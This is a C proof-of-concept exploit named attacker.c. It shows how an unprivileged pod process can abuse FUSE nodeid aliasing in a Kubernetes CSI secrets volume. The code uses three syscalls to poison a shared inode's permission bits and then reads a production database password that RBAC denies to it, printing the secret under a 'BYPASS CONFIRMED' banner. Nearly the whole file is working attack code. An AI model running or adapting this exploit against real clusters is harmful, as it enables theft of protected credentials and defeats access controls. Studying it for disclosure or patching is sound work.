/* attacker.c — pod process exploiting FUSE nodeid aliasing
 *
 * Runs as uid=1000 inside a Kubernetes pod.
 * The pod has a CSI secrets volume mounted at /secrets containing:
 *
 *   /secrets/dev-shared-key    mode=0644  (dev-sa has RBAC access)
 *   /secrets/prod-db-password  mode=0000  (RBAC denies dev-sa access)
 *
 * The CSI driver uses MD5(secret_value) as the FUSE nodeid.
 * Both secrets share the same value → same MD5 → same FUSE nodeid → one VFS inode.
 *
 * Attack — 3 syscalls, no capabilities, no exploit code:
 *   stat(prod-db-password)  → FUSE_LOOKUP → inode mode=0000 cached
 *   stat(dev-shared-key)    → FUSE_LOOKUP → shared inode mode poisoned to 0644
 *   open(prod-db-password)  → kernel: mode=0644, other=r → ALLOWED
 *
 * Compile: gcc -O2 -o attacker attacker.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>

#define SECRETS_DIR   "/secrets"
#define PROD_SECRET   SECRETS_DIR "/prod-db-password"
#define DEV_SECRET    SECRETS_DIR "/dev-shared-key"

static void show_inode(const char *label, const char *path)
{
    struct stat st;
    if (stat(path, &st) == 0)
        printf("    kernel inode: mode=0%04o  nodeid=0x%lx  ← %s\n",
               st.st_mode & 0xFFF, (unsigned long)st.st_ino, label);
    else
        printf("    stat failed:  %s  (%s)\n", strerror(errno), label);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  POD ATTACKER — uid=%-4d  no sudo · no capabilities · no exploit ║\n",
           (int)getuid());
    printf("╠══════════════════════════════════════════════════════════════╣\n");
    printf("║  Secrets volume: %-45s║\n", SECRETS_DIR);
    printf("║  Kubernetes RBAC says dev-sa CANNOT read prod-db-password   ║\n");
    printf("║  CVE: fuse_stale_inode() ignores permission bits            ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");

    /* ── Pre-check: confirm RBAC + inode mode block us ─────────────────── */
    printf("[ PRE-CHECK ] prod-db-password should be inaccessible...\n");
    {
        int r = faccessat(AT_FDCWD, PROD_SECRET, R_OK, 0);
        if (r < 0 && errno == EACCES)
            printf("    faccessat(prod-db-password, R_OK) = DENIED (EACCES)  ✓ correct\n\n");
        else if (r < 0)
            printf("    faccessat(prod-db-password, R_OK) = %s\n\n", strerror(errno));
        else
            printf("    already accessible — no exploit needed?\n\n");
    }

    /* ── Step 1: stat(prod-db-password) ─────────────────────────────────
     * Kernel sends FUSE_LOOKUP to CSI driver.
     * Driver replies: nodeid=0x651b3722d014767b, mode=0000, ttl=3600s
     * Kernel creates inode 0x651b... with mode=0000.
     * Dentry "prod-db-password" cached for 1 hour — no re-validation.
     * ─────────────────────────────────────────────────────────────────── */
    printf("[ STEP 1 ] stat(prod-db-password)\n");
    printf("    → FUSE_LOOKUP sent to CSI driver\n");
    printf("    → driver: nodeid=0x651b3722d014767b, mode=0000, ttl=3600s\n");
    printf("    → kernel creates inode with mode=0000\n");
    show_inode("inode just created", PROD_SECRET);
    printf("    Dentry cached for 1 hour.\n\n");

    /* ── Step 2: stat(dev-shared-key) ── the poison ──────────────────────
     * Kernel sends FUSE_LOOKUP for dev-shared-key.
     * Same nodeid! Driver replies: nodeid=0x651b3722d014767b, mode=0644
     * Kernel finds EXISTING inode 0x651b... → fuse_change_attributes()
     * updates mode: 0000 → 0644
     * fuse_stale_inode() only checks S_IFMT (>> 12) → both S_IFREG → NOT stale
     * ─────────────────────────────────────────────────────────────────── */
    printf("[ STEP 2 ] stat(dev-shared-key)  ← INODE POISON\n");
    printf("    → FUSE_LOOKUP sent to CSI driver\n");
    printf("    → driver: nodeid=0x651b3722d014767b, mode=0644\n");
    printf("    → kernel finds EXISTING inode → fuse_change_attributes()\n");
    printf("    → inode mode: 0000 → 0644  (fuse_stale_inode ignores permission bits)\n");
    show_inode("inode AFTER poison (shared by both secrets)", DEV_SECRET);
    printf("\n");

    /* ── Step 3: stat(prod-db-password) — verify the kernel was fooled ──
     * Dentry still cached (1-hour TTL not expired).
     * Kernel does NOT send FUSE_LOOKUP — CSI driver is never consulted.
     * Kernel reads inode 0x651b... from VFS cache → mode=0644
     * ─────────────────────────────────────────────────────────────────── */
    printf("[ STEP 3 ] stat(prod-db-password) — dentry cached, NO FUSE_LOOKUP sent\n");
    printf("    Watch the CSI driver log — it should print NOTHING for this stat.\n");
    show_inode("prod-db-password via cached dentry (SHOULD be 0000)", PROD_SECRET);
    printf("\n");

    /* ── Step 4: open(prod-db-password) as uid=1000 ──────────────────────
     * Kernel permission check:
     *   inode->i_mode = 0644  (poisoned)
     *   uid=1000 is "other"
     *   0644 other=r → READ ALLOWED
     * No FUSE_ACCESS sent (default_permissions delegates to inode bits).
     * CSI driver's intended mode=0000 is never consulted.
     * ─────────────────────────────────────────────────────────────────── */
    printf("[ STEP 4 ] open(prod-db-password, O_RDONLY) as uid=%d\n", (int)getuid());
    printf("    Kernel: inode mode=0644, uid=%d is 'other' → READ allowed\n", (int)getuid());
    printf("    CSI driver mode=0000 never consulted (default_permissions).\n");
    printf("    Kubernetes RBAC check: NOT invoked (filesystem access, not API call).\n\n");

    int fd = open(PROD_SECRET, O_RDONLY);
    if (fd < 0) {
        printf("    open = DENIED (%s)\n\n", strerror(errno));
        printf("    Attack did not work on this environment.\n");
        printf("    Check: CSI driver running? Volume mounted at %s?\n", SECRETS_DIR);
        return 1;
    }

    char buf[256] = {0};
    ssize_t nr = read(fd, buf, sizeof(buf) - 1);
    close(fd);

    printf("    ┌──────────────────────────────────────────────────────────┐\n");
    printf("    │  open(prod-db-password)  =  OPENED   ← BYPASS!          │\n");
    printf("    │  read %2zd bytes: %-44s│\n", nr, buf);
    printf("    └──────────────────────────────────────────────────────────┘\n\n");

    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║                      BYPASS CONFIRMED                       ║\n");
    printf("╠══════════════════════════════════════════════════════════════╣\n");
    printf("║  Kubernetes RBAC denied:    dev-sa → prod-db-password       ║\n");
    printf("║  Filesystem FUSE daemon:    mode=0000 (no access)           ║\n");
    printf("║  Kernel inode (poisoned):   mode=0644 (open allowed)        ║\n");
    printf("║  Secret value read:         %s%-27s║\n", buf, "");
    printf("╠══════════════════════════════════════════════════════════════╣\n");
    printf("║  uid=1000 · no sudo · no capabilities · stat+stat+open      ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");

    return 0;
}
